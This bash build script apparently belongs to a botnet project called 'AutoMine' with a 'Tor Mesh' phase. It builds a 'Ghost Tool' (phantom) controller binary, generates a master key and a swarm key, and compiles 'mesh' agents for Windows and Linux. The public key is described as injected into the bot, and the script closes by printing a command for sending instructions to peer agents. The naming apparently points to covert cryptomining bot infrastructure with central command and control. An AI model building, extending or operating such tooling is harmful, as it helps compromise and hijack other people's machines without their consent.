#!/bin/bash
set -e

# Configuration
KEY_DIR="keys"
KEY_PATH="$KEY_DIR/master.key"

echo "[*] AutoMine Key Generator & Builder (Phase 13: Tor Mesh)"
mkdir -p "$KEY_DIR"

echo "[1] Building Ghost Tool (Phantom)..."
cargo build --release --bin phantom -p phantom

echo "[2] Generating Keys in $KEY_DIR..."
GHOST_BIN="./target/release/phantom"
chmod +x $GHOST_BIN 2>/dev/null

if [ ! -f "$KEY_PATH" ]; then
    $GHOST_BIN --keygen "$KEY_PATH"
else
    echo "[*] Key already exists at $KEY_PATH"
fi

if [ -f "$KEY_DIR/master.pub" ]; then
    PUB_KEY=$(cat "$KEY_DIR/master.pub")
    echo "[+] Public Key Generated: $PUB_KEY"
else
    echo "[-] Public Key file not found!"
    exit 1
fi

# Generate Swarm Key (32 bytes hex)
SWARM_KEY_PATH="$KEY_DIR/swarm.key"
if [ ! -f "$SWARM_KEY_PATH" ]; then
    openssl rand -hex 32 > "$SWARM_KEY_PATH"
    echo "[+] Generated Swarm Key"
fi
SWARM_KEY=$(cat "$SWARM_KEY_PATH")

echo "[3] Building Windows Agent..."
make mesh_windows_amd64

echo "[4] Building Linux Agents..."
make mesh_linux_amd64
make mesh_linux_arm64

echo "[OK] Build Complete."
echo " -> Master Key: $KEY_PATH (KEEP PRIVATE)"
echo " -> Master Pub: ${KEY_PATH}.pub (Injected into Bot)"
echo ""
echo "Artifacts are in 'dist/':"
ls -lh dist/
echo ""
echo "To control the Mesh:"
echo "  $GHOST_BIN --key '$KEY_PATH' --target <PEER_ID> --cmd 'ping'"
